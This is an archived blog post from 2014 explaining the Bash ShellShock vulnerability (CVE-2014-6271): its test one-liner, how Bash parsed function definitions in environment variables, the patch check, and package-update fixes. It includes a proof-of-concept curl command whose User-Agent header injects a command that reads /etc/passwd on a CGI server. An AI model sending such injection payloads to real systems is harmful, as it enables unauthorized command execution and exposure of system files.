<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Linux Bash Vulnerability: ShellShock - ZengHui Bao's blog</title>
    <meta name="description" content="zenghui bao's program world.">
    <meta name="author" content="zenghui bao">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="/static/favicon.ico" rel="shortcut icon">
    <link href="/static/css/bootstrap.css" rel="stylesheet" type="text/css" media="all">
    <link href="/static/css/font-awesome.css" rel="stylesheet" type="text/css" media="all">
    <link href="/static/google-code-prettify/prettify.css" rel="stylesheet" type="text/css" media="all">
    <link href="/static/css/application.css" rel="stylesheet" type="text/css" media="all">
    <script src="/static/js/jquery.js" type="text/javascript"></script>
    <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
</head>
<body>
     <div class="page-container">
     <div class="page-heading">
         <div class="page-brand">
             <h1><a href="/">A Diligent Programmer</a></h1>
			 <h2><font size="3">Zenghui Bao's programming world.</font></h2>
         </div>
         <div class="page-navbar">
             <div class="page-navbar-container">
                 <ul class="page-nav">
                     <li><a href="/">Home</a></li>
                     <li><a href="/archive.html">Archive</a></li>
                     <li><a href="/about">About</a></li>
                 </ul>
             </div>
         </div>
     </div>
     <div class="page-article">
         <div class="page-content">
    <div class="post-heading">
        Linux Bash Vulnerability: ShellShock
    </div>
    <div class="post-meta">
        <span>
            Posted on:
            <a href="/2014-10/linux-bash-vulnerability-ShellShock/"><span class='month'>Oct</span> <span class='day'>02</span> <span class='year'>2014</span></a>
        </span>
        <span><i class="fa fa-ellipsis-v"></i></span>
        <span>
            Categories:
            
            <a href="/categories.html#Software_development bash-ref">Software_development bash</a>
            
        </span>
        <span><i class="fa fa-ellipsis-v"></i></span>
        <span>
            Tags:
            
            <a href="/tags.html#bash ShellShock-ref">bash ShellShock</a>
            
        <span>
    </div>
    <div class="post-entry">
        <p>French Linux enthusiasts Stéphane Chazelas in mid-September 2014, discovered the famous BASH SHELL implementation vulnerability (ShellShock, number CVE-2014-6271), it can execute script code by constructing environment variables. This vulnerability can affect a large number of linux application interact with bash, so that the America National ​​Security Division score this vulnerability 10 points, this is the most devastating score. This essay mainly discusses about the condition of the loophole occurrence, principle analysis, and vulnerability remediation methods.</p>

<!--more-->


<h3>Origin and Description of Vulnerability</h3>

<p>Vulnerability Information has been firstly described in the 34,765 vulnerability report from exploit-db, a well-known vulnerabilities website, the paper gives a validation command:</p>

<pre><code class="sh">    env x='() { :;}; echo vulnerable' bash -c "echo this is a test"  
</code></pre>

<p>If execute this command in linux/unix bash(Bash 4.3 or earlier version), you may get the following output:</p>

<pre><code>vulnerable
this is a test
</code></pre>

<p>If the first line of result appear <code>vulnerable</code>, illustrate the system has a vulnerability of arbitrary commands execution caused by bash implementation bug. This problem exists GNU Bash 4.3 and earlier versions. Through adding some string after function definition in environment variable values, an attacker can change or bypass environmental restrictions to execute Shell command.</p>

<h3>Condition of Vulnerability Occurrence</h3>

<p>Any known application, as long as the following two conditions are met, it can be used to execute arbitrary commands via bash vulnerability:</p>

<ol>
<li>The program uses bash at some point processing environment variable assignments;</li>
<li>The environment variable assignments string depending on user input.</li>
</ol>


<p>Affected severely are the Apache servers using mod_cgi or mod_fcgid module, and must meet:</p>

<ol>
<li>After server receives the request, it will execute bash.</li>
<li>When execute bash, it will set as environment variables like UserAgent.</li>
</ol>


<h3>Demonstration of Exploit Vulnerability, and Principle Analysis</h3>

<p>Here is the test script:</p>

<pre><code class="sh">    $ curl -A ‘() { :; }; /bin/cat /etc/passwd &gt; dumped_file’ http://192.168.0.1/poc.cgi 
</code></pre>

<p>poc.cgi is a cgi script beginning with <code>#! /bin/bash</code>.<br/>
On the server side things will happen:</p>

<ul>
<li><p>Receives an HTTP request, the request with the Head<code>User-Agent: () {:;}; / bin / cat / etc / passwd&gt; dumped_file</code></p></li>
<li><p>The server set User-Agent as environment variable, and execute bash.</p></li>
<li><p>Because of bash parsing vulnerability, it execute the following script:</p></li>
</ul>


<pre><code class="sh">        $ /bin/cat /etc/passwd &gt; dumped_file
</code></pre>

<p>When shell interpreter deal with environment variable assignment, it execute the command after the function body. But the value of environment variable is a string, how was it transform into a function?</p>

<p>In fact, this is related to Bash Implementation. Define a function in Bash, the format is:</p>

<pre><code class="C++">    function function_name() {
        body;
    }
</code></pre>

<p>If Bash parser find a small brackets and braces while initializing environment variables, it treate the string as a function definition.</p>

<pre><code class="sh">    [root@baozenghui ~]$ say_hello='() { echo hello world; }'
    [root@baozenghui ~]$ export say_hello
    [root@baozenghui ~]$ bash -c 'say_hello'
    hello world 
</code></pre>

<p>Executing the above code in the new Bash process, <code>say_hello</code> became a function in the new environment, its evolution as follows:
1. A new bash process scans at initialization, find parentheses and braces after environment variable <code>say_hello</code>, figuring it's a function definition.
2. Bash set <code>say_hello</code> as a function name, and its value as a function of the body.</p>

<p>By combining patch, analysis Bash source code, in fact, Bash actually want to initialize environment variables and define some functions at startup,</p>

<p>By combining patch, analyzing Bash source code, in fact, Bash actually want to define some environment variables and functions at startup, the initialization way is to execute variable assignment statements(such as <code>name = value</code> format), when encounter a function definition, convert it into a function, that's all the thing it wanted to do. But when bash scanning into the function definition, converting it into a function, it accidentally execute the next command for the sake of no comprehensive consideration when parsing. Therefore, statements added to determine the legality of the function body in the patch:</p>

<pre><code class="c++">    #define SEVAL_FUNCDEF 0x080       /* only allow function definitions */
    #define SEVAL_ONECMD  0x100       /* only allow a single command */
    if ((flags &amp; SEVAL_FUNCDEF) &amp;&amp; command-&gt;type != cm_function_def)
    {
        //illegal, not a function definition.
        break;
    }
</code></pre>

<h3>Vulnerability Remediation</h3>

<p>In UTC Time September 25, 2014 morning, CVE-2014-7169 vulnerability has been repaired by BASH community, the major GNU/Linux distributions, including Debian, Gentoo, OpenSUSE, CentOS, RHEL, have provided relevant upgrade.</p>

<p>centos:</p>

<pre><code class="sh">    $ yum clean all 
    $ yum makecache 
    $ yum -y update bash 
</code></pre>

<p>ubuntu:</p>

<pre><code class="sh">    $ apt-cache gencaches 
    $ apt-get -y install --only-upgrade bash 
</code></pre>

<p>debian:</p>

<pre><code class="sh">    $ apt-cache gencaches 
    $ apt-get -y install --only-upgrade bash
</code></pre>

<h3>Related Links:</h3>

<p><a href="https://access.redhat.com/security/cve/CVE-2014-6271">Link1</a><br/>
<a href="https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/">Link2</a></p>

    </div>
</div>
<div class="post-blank post-pager">
    <ul class="pager">
        
        <li class="previous"><a href="/2014-05/a-simple-practice-of-implementing-string-class/">&larr; Prev</a></li>
        
        
        <li class="next"><a href="/2014-10/quicksort-in-list/">Next &rarr;</a></li>
        
    </ul>
</div>
	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
	<div class="ds-thread"></div>
	<script type="text/javascript">
		var duoshuoQuery = {short_name:"zenghui123"};
		(function() {
			var ds = document.createElement('script');
			ds.type = 'text/javascript';ds.async = true;
			ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
			ds.charset = 'UTF-8';
			(document.getElementsByTagName('head')[0] 
			 || document.getElementsByTagName('body')[0]).appendChild(ds);
		})();
	</script>
	<!-- 多说公共JS代码 end -->





     </div>
     <div class="page-footer">
         <span>
             Powered by <a href="https://github.com/mojombo/jekyll">Jekyll</a> 
             | Hosted by <a href="http://github.com">Github.com</a> 
         </span>
     </div>
     </div>
     <script src="/static/js/bootstrap.js" type="text/javascript"></script>
     <script src="/static/google-code-prettify/prettify.js" type="text/javascript"></script>
     <script type="text/javascript">
        $(document).ready(function() {
            $('pre').addClass('prettyprint').attr('style', 'overflow:auto');
            prettyPrint();
        });
     </script>
     <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-34850864-1']);
    _gaq.push(['_trackPageview']);
    (function() {
        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
</script>


</body>
</html>

